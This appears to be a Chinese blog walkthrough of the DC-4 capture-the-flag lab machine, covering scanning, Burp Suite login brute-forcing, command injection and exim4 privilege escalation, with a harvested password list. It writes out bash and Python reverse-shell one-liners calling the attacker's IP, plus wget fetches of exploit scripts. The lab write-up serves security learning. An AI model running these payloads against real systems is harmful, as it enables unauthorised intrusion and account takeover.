    <content type="html"><![CDATA[<h1 id="DC-4"><a href="#DC-4" class="headerlink" title="DC-4"></a>DC-4</h1><h2 id="IP扫描"><a href="#IP扫描" class="headerlink" title="IP扫描"></a>IP扫描</h2><p>通过开关目标靶机来确认目标靶机的IP地址。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sN  192.168.204.0/24<br></code></pre></td></tr></table></figure><p>开靶机前：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704224901788.png" alt="image-20240704224901788"></p><p>开靶机后：<br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704224934605.png" alt="image-20240704224934605"></p><p>对比之下可以得到目标靶机的IP地址为：<code>192.168.204.133</code>。</p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><h3 id="扫描开放的TCP端口"><a href="#扫描开放的TCP端口" class="headerlink" title="扫描开放的TCP端口"></a>扫描开放的TCP端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sN -p- 192.168.204.133<br>nmap -sT -p- 192.168.204.133<br></code></pre></td></tr></table></figure><p><code>-sN</code>：表示执行Null扫描，Null扫描是一种TCP扫描技术。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704225650473.png" alt="image-20240704225650473"></p><p>扫描结果显示，开放的端口为<code>22</code>端口和<code>80</code>端口。</p><h3 id="扫描开放的UDP端口"><a href="#扫描开放的UDP端口" class="headerlink" title="扫描开放的UDP端口"></a>扫描开放的UDP端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sU -top-ports 20 -p- 192.168.204.133<br></code></pre></td></tr></table></figure><p><code>-sU</code>：表示执行UDP扫描，UDP不建立连接，所以端口扫描和响应的处理方式不同。</p><p><code>-top-ports</code>：指定扫描的端口数量，该参数后面跟一个数字。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704230408447.png" alt="image-20240704230408447"></p><p>根据<code>STATE</code>字段，我们发现还是有蛮多开放的UDP端口的，但是一般不对UDP端口进行测试，其优先级靠后。</p><h2 id="端口详细信息扫描（tcp）"><a href="#端口详细信息扫描（tcp）" class="headerlink" title="端口详细信息扫描（tcp）"></a>端口详细信息扫描（tcp）</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT -sV -sC -O -p 22,80 192.168.204.133<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704231641121.png" alt="image-20240704231641121"></p><p>根据扫描结果，可以得知：</p><blockquote><p>22端口开放的是ssh服务，运行版本为OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)，其中还给出了ssh主机密钥。提示可以进行ssh远程连接。</p><p>80端口开放的是http服务，运行版本是nginx 1.15.10。</p></blockquote><h2 id="nmap漏扫"><a href="#nmap漏扫" class="headerlink" title="nmap漏扫"></a>nmap漏扫</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -script=vuln -p 22,80 192.168.204.133<br></code></pre></td></tr></table></figure><p>这次nmap漏扫的响应时间比较长，得到如下结果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240705134104640.png" alt="image-20240705134104640"></p><p>根据结果可知，80端口http服务可能存在着<code>csrf（跨站请求伪造）</code>漏洞。路径为：</p><blockquote><p> <a href="http://192.168.204.133/">http://192.168.204.133:80/</a></p><p> <a href="http://192.168.204.133/login.php">http://192.168.204.133:80/login.php</a></p></blockquote><p>通过网站浏览可以发现这两个网址打开都是相同的登陆界面。为了便于后续漏洞利用，比如植入一句话木马之类的，我们后续均使用<code>http://192.168.204.133:80/login.php</code></p><h2 id="网页信息收集"><a href="#网页信息收集" class="headerlink" title="网页信息收集"></a>网页信息收集</h2><p>访问链接：<code>http://192.168.204.133:80/login.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240705134633165.png" alt="image-20240705134633165"></p><p>直接就是一个管理信息系统登陆界面。</p><p>使用Wappalyzer查看网页的技术构成：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240705134758802.png" alt="image-20240705134758802"></p><p>没有得到有关网页框架等相关信息，即，没啥有用信息。</p><p>既然是登陆界面,自然就要想方设法获取合法的管理员登陆账号。可以先做目录爆破看看能否得到一些有用的资源信息。</p><h3 id="gubuster目录爆破"><a href="#gubuster目录爆破" class="headerlink" title="gubuster目录爆破"></a>gubuster目录爆破</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://192.168.204.133 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240705135323268.png" alt="image-20240705135323268"></p><p>似乎没有得到什么有用的信息,访问爆破得到的两个网址:</p><blockquote><p><a href="http://192.168.204.133/images/">http://192.168.204.133/images/</a></p><p><a href="http://192.168.204.133/css/">http://192.168.204.133/css/</a></p></blockquote><p>两个网页的访问响应都是<code>403 Forbidden</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240705135444738.png" alt="image-20240705135444738"></p><blockquote><p><code>403 Forbidden</code>:是指在尝试访问网站或特定页面时,服务器拒绝了请求。发生该问题通常是由于以下原因造成的：权限不足、IP地址限制、访问控制列表（ACL）限制、http身份验证失败、目录列表拒绝、内容过滤或防火墙规则。</p></blockquote><p>所以这次目录爆破等于无效爆破，爆破出来的目录访问是被服务器拒绝的。</p><p>目前为止,捋一下思绪。我们通过nmap漏扫发现了网站可能存在<code>csrf漏洞</code>，然后我们通过目录爆破出来的网址链接，访问均被服务器拒绝。通过Wappalyzer分析网页的技术构成，也没有得到有关于网页框架等有用的信息。</p><p>所以,接下来,我们就要以目标网站的csrf漏洞为切入点。</p><h3 id="访问存在csrf漏洞的登陆网页"><a href="#访问存在csrf漏洞的登陆网页" class="headerlink" title="访问存在csrf漏洞的登陆网页"></a>访问存在csrf漏洞的登陆网页</h3><p>使用burpsuite进行抓包检查登陆界面上用户名和密码的传输方式。</p><p>在登陆界面随机输入一些用户名和密码，然后点击“Submit”：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240705210622750.png" alt="image-20240705210622750"></p><p>查看burpsuite拦截到的数据包：<br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240705210734505.png" alt="image-20240705210734505"></p><p>得到的信息有：</p><blockquote><p>请求方式为POST，传输方式是明文：username&#x3D;chfhj&amp;password&#x3D;hkjhk</p></blockquote><h3 id="burpsuite爆破"><a href="#burpsuite爆破" class="headerlink" title="burpsuite爆破"></a>burpsuite爆破</h3><p>已知账号密码传输的方式以及明文传输格式，因此可以通过抓包进行账号密码的爆破。仅设置<code>username</code>和<code>password</code>两个payload集合，然后通过用户名字典和密码字典进行爆破。(<a href="http://192.168.204.133/login.php">http://192.168.204.133:80/login.php</a>)</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240705212615851.png" alt="image-20240705212615851"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240705213405067.png" alt="image-20240705213405067"></p><p>之后就是设置<code>payload</code>。注意，在前面<code>positions</code>选中了多少个爆破变量位置，后面就要设置多少个<code>payload</code>，set下的数字代表的是position 参数编号。需要按序分别选择然后导入爆破字典。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706223514917.png" alt="image-20240706223514917"></p><p>设置完<code>payload</code>之后就可以点击右上角的<code>start attack</code>开始进行攻击。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706222807477.png" alt="image-20240706222807477"></p><p>爆破完后（当然也可以是在爆破之前）进行过滤设置。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706223951881.png" alt="image-20240706223951881"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706224012970.png" alt="image-20240706224012970"></p><p>设置只显示状态码为2xx系列成功的数据包。</p><p>爆破（花了很长时间）得到用户名和密码：</p><blockquote><p>username：admin     password：happy</p></blockquote><p>但是爆破结果不仅得到了上面的账号和密码，还有其它的爆破成功的用户名密码对：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706223251316.png" alt="image-20240706223251316"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706223327065.png" alt="image-20240706223327065"></p><h2 id="Get-shell"><a href="#Get-shell" class="headerlink" title="Get shell"></a>Get shell</h2><p>使用上述爆破得到的账号密码进行登陆。登陆后的界面如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706095837540.png" alt="image-20240706095837540"></p><p>点击“Command”得到如下界面：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706095909244.png" alt="image-20240706095909244"></p><p>点击“Run”：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706095954196.png" alt="image-20240706095954196"></p><p>有提示信息：<code>You have selected: ls -l</code>，似乎在指示，我们通过前端执行了命令<code> ls -l</code>。尝试抓包看看是否能够更改这条指令。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706134153866.png" alt="image-20240706134153866"></p><p>可以看到的是，抓取的包以明文的形式显示出了<code>ls -l</code>指令，即<code>ls+-l</code>。尝试修改该指令并进行重放。将其修改为<code>cat index.php</code>即,<code>cat+index.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706134704114.png" alt="image-20240706134704114"></p><p>然后进行放行! </p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706134737052.png" alt="image-20240706134737052"></p><p>ok!成功地执行了我们修改的命令。so！我们就可以通过命令来反弹shell了。</p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><ul><li><p>实践gpt上面的反弹shell操作方案</p><p>首先需要现在攻击机进行端口监听：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -nvlp 9999<br>/bin/bash -i &gt;&amp; /dev/tcp/192.168.204.128/9999 0&gt;&amp;1<br>burpsuite编码：<br>/bin/bash%20-i%20%3E%26%20/dev/tcp/192.168.204.128/9999%200%3E%261<br></code></pre></td></tr></table></figure><p>这里的IP地址是攻击机（kali）的IP地址。</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706142153965.png" alt="image-20240706142153965"></p><p>好！失败。。。</p><ul><li>编写脚本进行命令注入，进而实现反弹shell</li></ul><p>首先编写反弹脚本：</p><p>设置监听目标IP以及监听端口。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">import socket,subprocess,os;<br>s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);<br>s.connect((&quot;<span class="hljs-number">192.168</span>.<span class="hljs-number">204.128</span>&quot;,<span class="hljs-number">9999</span>));<br>os.dup2(s.fileno(),0);<br>os.dup2(s.fileno(),1); <br>os.dup2(s.fileno(),2);<br>p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);<br></code></pre></td></tr></table></figure><p>然后直接在终端命令行执行脚本代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.204.128&quot;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br><br>python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%<span class="hljs-number">22192.168</span>.<span class="hljs-number">204.128</span>%<span class="hljs-number">22</span>,<span class="hljs-number">9999</span>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706151934510.png" alt="image-20240706151934510"></p><p>然后放行。反弹成功，获取目标靶机合法用户的登陆权限。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706152723101.png" alt="image-20240706152723101"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查看当前具有SUID权限的命令;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706155330709.png" alt="image-20240706155330709"></p><p>其中，可以尝试的提权命令有：</p><blockquote><p>passwd、exim4、mount、su</p></blockquote><p>首先先切换到对方用户登陆的模式。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;);&quot;</span><br></code></pre></td></tr></table></figure><p>逐一尝试这些可能被提权的命令：</p><blockquote><p><code>passwd</code>：passwd root</p><p><code>mount</code>：mount –o bind &#x2F;bin&#x2F;bash &#x2F;usr&#x2F;bin&#x2F;mount</p><p><code>su</code>：su</p><p><code>exim4</code>：</p></blockquote><p>提示无法修改root用户的密码，表明没有root权限，没提权成功。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706221743698.png" alt="image-20240706221743698"></p><p>提示只有root用户能够使用 <code>--options</code>，表明当前没有提权成功。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706222057830.png" alt="image-20240706222057830"></p><p>提示需要输入密码，后台管理系统的登陆账户密码也不管用。很难通过尝试进行提权。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706222458733.png" alt="image-20240706222458733"></p><p>最后是exim4，它的提权难度较大。</p><p>首先先查看exim4的版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">exim4 --version<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706224633919.png" alt="image-20240706224633919"></p><blockquote><p>exim4：4.89</p></blockquote><p>明确使用exim4进行提权后，使用<code>searchsploit</code>查询可用于提权的代码文件。</p><p>注意！正常来说，命令应该是exim，不是exim4哦！这么输入会报错的。</p><p>exim4：exim指令的version4。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit exim 4<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706225050928.png" alt="image-20240706225050928"></p><p>搜索得到的结果不少哦！一般文件后缀为txt文件的比较容易实现。但是这些实现都需要自己手动按照其指示的方法实现。</p><blockquote><p>linux&#x2F;remote&#x2F;25297.txt</p><p>linux&#x2F;remote&#x2F;46974.txt</p><p>multiple&#x2F;dos&#x2F;43184.txt</p><p>linux&#x2F;local&#x2F;39549.txt</p><p>linux&#x2F;dos&#x2F;23896.txt</p></blockquote><p>仔细一看，我们发现其中有<code>.sh</code>后缀的文件，这些文件一般为shell脚本文件。通过运行命令就可以进行利用的，会比手动实现方法相对节省时间。</p><blockquote><p>linux&#x2F;local&#x2F;796.sh</p><p>linux&#x2F;local&#x2F;39535.sh</p><p>linux&#x2F;local&#x2F;46996.sh</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706225933071.png" alt="image-20240706225933071"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit -m 796.sh<br>searchsploit -m 39535.sh<br>searchsploit -m 46996.sh<br></code></pre></td></tr></table></figure><p>将这三个.sh文件均下载到当前目录下。</p><p>然后将脚本部署到服务器中，并让目标靶机通过<code>wget</code>命令下载该提权脚本进行执行（以目标靶机合法用户的身份以及交互界面下载）。</p><p>当前kali与目标靶机位于同一网段。所以可以在本机（kali）部署<code>apache2</code>服务让目标靶机下载即可。</p><p>首先在本机（kali）启动apache2服务，然后将下载的shell脚本文件复制到 <code>/var/www/html/</code>文件夹下，相当于放到网页上。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">service apache2 start<br><span class="hljs-built_in">cp</span> 796.sh /var/www/html/<br>service apache2 status  //查看状态<br><br><span class="hljs-built_in">cp</span> 39535.sh /var/www/html/<br><span class="hljs-built_in">cp</span> 46996.sh /var/www/html/<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706232255198.png" alt="image-20240706232255198"></p><p>为了防止某一个脚本提权失败，我们把其它的脚本也复制上去。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706233427682.png" alt="image-20240706233427682"></p><p>然后到目标靶机（目标靶机用户交互界面处），执行下载操作。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://192.168.204.128/796.sh<br>wget http://192.168.204.128/39535.sh<br>wget http://192.168.204.128/46996.sh<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706232619485.png" alt="image-20240706232619485"></p><p>由于权限不够，所以下载操作被拒绝了，无法在当前目录进行写入。</p><blockquote><p>一般情况下，<code>tmp</code>目录都具有相当高的权限。</p></blockquote><p>因此，可以尝试切换到<code>/tmp</code>目录下进行提权脚本的下载。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706232913257.png" alt="image-20240706232913257"></p><p>下载成功。把三个都给下载了：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706234051092.png" alt="image-20240706234051092"></p><p>然后为下载的脚本加上可执行权限，并执行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x 796.sh<br>./796.sh<br><br><span class="hljs-built_in">chmod</span> +x 39535.sh<br>./39535.sh<br><br><span class="hljs-built_in">chmod</span> +x 46996.sh<br>./46996.sh<br></code></pre></td></tr></table></figure><ul><li>.&#x2F;796.sh：发生gcc错误，提权失败。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706233248963.png" alt="image-20240706233248963"></p><ul><li>39535.sh：没有找到exim命令，提权失败。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706234322456.png" alt="image-20240706234322456"></p><ul><li>46996.sh：提权成功。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706234350082.png" alt="image-20240706234350082"></p><p>查找flag文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *flag*<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706234829075.png" alt="image-20240706234829075"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /root/flag.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706234846253.png" alt="image-20240706234846253"></p><p>至此，所有工作完成。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次是通过burpsuite进行用户名和密码爆破，然后通过shell注入、反弹shell以及命令提权获取最后的flag。</p><p>但是在之前进行Getshell的时候我们还使用到了ssh远程连接。</p><p>所以对于这个靶场，也可以尝试进行ssh爆破（hydra）。</p><blockquote><p>一般在<code>/home</code>目录下能够找到其他用户的文件夹或者更多信息，也能够从各个文件夹中找到更多信息。</p></blockquote><p>在提权成功后，在<code>/home</code>目录下的jim-backups文件夹中，发现了一个名为<code>old-passwords.bak</code>的文件。</p><p>注意！home目录下的三个文件夹看着很像用户的文件夹。所以在后续进行爆破的时候，用户名字典就从这三个文件夹名入手。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706235128164.png" alt="image-20240706235128164"></p><blockquote><p>.bak后缀的文件通常是备份文件。用于存储数据的副本，以防止原始文件意外丢失或损坏。</p></blockquote><p>查看其具体内容,可以猜测是一个密码字典。对其进行复制保存，也许以后爆破的时候会用上。</p><blockquote><p>000000<br>12345<br>iloveyou<br>1q2w3e4r5t<br>1234<br>123456a<br>qwertyuiop<br>monkey<br>123321<br>dragon<br>654321<br>666666<br>123<br>myspace1<br>a123456<br>121212<br>1qaz2wsx<br>123qwe<br>123abc<br>tinkle<br>target123<br>gwerty<br>1g2w3e4r<br>gwerty123<br>zag12wsx<br>7777777<br>qwerty1<br>1q2w3e4r<br>987654321<br>222222<br>qwe123<br>qwerty123<br>zxcvbnm<br>555555<br>112233<br>fuckyou<br>asdfghjkl<br>12345a<br>123123123<br>1q2w3e<br>qazwsx<br>loveme1<br>juventus<br>jennifer1<br>!~!1<br>bubbles<br>samuel<br>fuckoff<br>lovers<br>cheese1<br>0123456<br>123asd<br>999999999<br>madison<br>elizabeth1<br>music<br>buster1<br>lauren<br>david1<br>tigger1<br>123qweasd<br>taylor1<br>carlos<br>tinkerbell<br>samantha1<br>Sojdlg123aljg<br>joshua1<br>poop<br>stella<br>myspace123<br>asdasd5<br>freedom1<br>whatever1<br>xxxxxx<br>00000<br>valentina<br>a1b2c3<br>741852963<br>austin<br>monica<br>qaz123<br>lovely1<br>music1<br>harley1<br>family1<br>spongebob1<br>steven<br>nirvana<br>1234abcd<br>hellokitty<br>thomas1<br>cooper<br>520520<br>muffin<br>christian1<br>love13<br>fucku2<br>arsenal1<br>lucky7<br>diablo<br>apples<br>george1<br>babyboy1<br>crystal<br>1122334455<br>player1<br>aa123456<br>vfhbyf<br>forever1<br>Password<br>winston<br>chivas1<br>sexy<br>hockey1<br>1a2b3c4d<br>pussy<br>playboy1<br>stalker<br>cherry<br>tweety<br>toyota<br>creative<br>gemini<br>pretty1<br>maverick<br>brittany1<br>nathan1<br>letmein1<br>cameron1<br>secret1<br>google1<br>heaven<br>martina<br>murphy<br>spongebob<br>uQA9Ebw445<br>fernando<br>pretty<br>startfinding<br>softball<br>dolphin1<br>fuckme<br>test123<br>qwerty1234<br>kobe24<br>alejandro<br>adrian<br>september<br>aaaaaa1<br>bubba1<br>isabella<br>abc123456<br>password3<br>jason1<br>abcdefg123<br>loveyou1<br>shannon<br>100200<br>manuel<br>leonardo<br>molly1<br>flowers<br>123456z<br>007007<br>password.<br>321321<br>miguel<br>samsung1<br>sergey<br>sweet1<br>abc1234<br>windows<br>qwert123<br>vfrcbv<br>poohbear<br>d123456<br>school1<br>badboy<br>951753<br>123456c<br>111<br>steven1<br>snoopy1<br>garfield<br>YAgjecc826<br>compaq<br>candy1<br>sarah1<br>qwerty123456<br>123456l<br>eminem1<br>141414<br>789789<br>maria<br>steelers<br>iloveme1<br>morgan1<br>winner<br>boomer<br>lolita<br>nastya<br>alexis1<br>carmen<br>angelo<br>nicholas1<br>portugal<br>precious<br>jackass1<br>jonathan1<br>yfnfif<br>bitch<br>tiffany<br>rabbit<br>rainbow1<br>angel123<br>popcorn<br>barbara<br>brandy<br>starwars1<br>barney<br>natalia<br>jibril04<br>hiphop<br>tiffany1<br>shorty<br>poohbear1<br>simone<br>albert<br>marlboro<br>hardcore<br>cowboys<br>sydney<br>alex<br>scorpio<br>1234512345<br>q12345<br>qq123456<br>onelove<br>bond007<br>abcdefg1<br>eagles<br>crystal1<br>azertyuiop<br>winter<br>sexy12<br>angelina<br>james<br>svetlana<br>fatima<br>123456k<br>icecream<br>popcorn1</p></blockquote><p>kali默认密码字典：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/usr/share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure><p>pay：如果之前没有进入到目标目录对默认字典文件进行解压的话，是会报错的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gunzip rockyou.txt.gz<br></code></pre></td></tr></table></figure><h3 id="hydra爆破"><a href="#hydra爆破" class="headerlink" title="hydra爆破"></a>hydra爆破</h3><p>使用默认密码字典进行爆破的话所需的时间 太长了，而且也有爆破失败的风险</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -L usersname.txt -P passworddicDC4.txt ssh://192.168.204.133<br></code></pre></td></tr></table></figure><p>其中：</p><p><code>passworddicDC4.txt</code>是上述从jim文件夹中获取到的密码备份文件。</p><p><code>usersname.txt</code>中包含在目标靶机home目录下的疑似用户文件夹的三个用户名。</p><p>ok！很快就爆破出了一个合法的SSH账户：</p><blockquote><p>host: 192.168.204.133 </p><p>login: jim </p><p>password: jibril04</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715131345123.png" alt="image-20240715131345123"></p><h3 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h3><blockquote><p>host: 192.168.204.133 </p><p>login: jim </p><p>password: jibril04</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh jim@192.168.204.133<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715131622681.png" alt="image-20240715131622681"></p><p>ok！成功远程登陆了jim账户。</p><h3 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h3><p>使用<code>sudo -l</code>显示出当前登陆用户的权限：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715131837232.png" alt="image-20240715131837232"></p><p>由上述执行结果可知，需要输入jim用户的sudo账户密码，但是我们不知道。</p><p>接着我们查看jim用户所在系统中具有SUID权限的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715132113057.png" alt="image-20240715132113057"></p><p>这其中，可以尝试的提权指令有：exim4、mount、su、passwd。但是经过上述的经验，最终能成功进行提权的命令只有exim4，但是它的提权过程比较复杂。</p><p>所以我们可以尝试获取其它信息并择出其中有用的信息进行提权。</p><p>使用<code>ls</code>指令查看当前用户的目录列表：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715132521386.png" alt="image-20240715132521386"></p><p>发现了一个shell脚本<code>test.sh</code>，但是光看名字感觉就好像不太能提权的样子。还有一个提示信息，提示在存储邮件文件的文件夹<code>/var/mail/jim</code>下有新的邮件，尝试进入查看并寻找有用信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> 